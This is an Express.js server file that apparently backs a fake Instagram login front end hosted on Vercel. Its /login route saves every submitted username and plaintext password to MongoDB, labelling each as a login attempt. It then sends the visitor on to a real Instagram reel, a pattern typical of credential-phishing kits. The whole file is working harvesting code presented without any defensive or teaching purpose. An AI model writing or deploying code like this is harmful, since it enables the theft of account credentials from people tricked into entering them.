require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const LoginModel = require('./models/Login');

const app = express();

// ✅ Allowed origins
const allowedOrigins = [
  "https://instagram-front-taupe.vercel.app"
];

// ✅ CORS middleware
app.use(cors({
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
}));

// ✅ Handle preflight (OPTIONS) for all routes
app.options('*', cors());

// ✅ Body parser
app.use(express.json());

// ✅ Logging incoming requests
app.use((req, res, next) => {
  console.log("Request received from:", req.headers.origin);
  next();
});

// ✅ MongoDB connection
mongoose.connect(process.env.mongoDB)
  .then(() => console.log('✅ MongoDB connected'))
  .catch((err) => console.error('❌ MongoDB connection error:', err));

// ✅ Test route
app.get('/', (req, res) => {
  res.json('Hello from backend');
});

// ✅ Login logic
app.post('/login', async (req, res) => {
  const { name, password } = req.body;

  try {
    const user = await LoginModel.findOne({ name });

    await LoginModel.create({ name, password }); // Save login attempt

    const redirectUrl = "https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";

    if (user) {
      return res.json({
        message: 'Already have an Account',
        redirect: redirectUrl
      });
    } else {
      return res.json({
        message: 'Account Created',
        redirect: redirectUrl
      });
    }

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server Error' });
  }
});

// ✅ Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
